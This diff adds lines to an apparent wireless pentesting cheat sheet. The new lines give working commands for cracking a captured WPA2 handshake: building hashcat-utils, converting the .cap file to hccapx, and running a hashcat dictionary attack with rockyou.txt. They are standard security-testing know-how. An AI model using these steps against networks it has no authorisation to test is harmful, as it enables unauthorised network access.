@@ -572,6 +572,19 @@ sudo airodump-ng wlan1 -c 11 --bssid 00:1C:10:00:00:00 -w ./capturePSK
 #### Cracking WPA2 handshake
 ##### Dictionnary attack
 
+Converting **.CAP** capture with handshake to **hccapx** hashcat format
+```
+sudo apt install git gcc
+git clone https://github.com/hashcat/hashcat-utils.git
+cd hashcat-utils/src/
+gcc cap2hccapx.c -o cap2hccapx.bin
+./cap2hccapx.bin wpa_handshake.cap handshake.hccapx
+```
+
+Dictionnary attack using hashcat
+```
+hashcat.exe -m 2500 handshake.hccapx wordlists/rockyou.txt
+```
 
 ##### Pre Computed PMK
 Pre computed PMK (Because PBKDF2 function is time consuming to proceed). You will still need to capture 4 Way handshake for SNonce, ANonce, AP MAC and Client MAC.
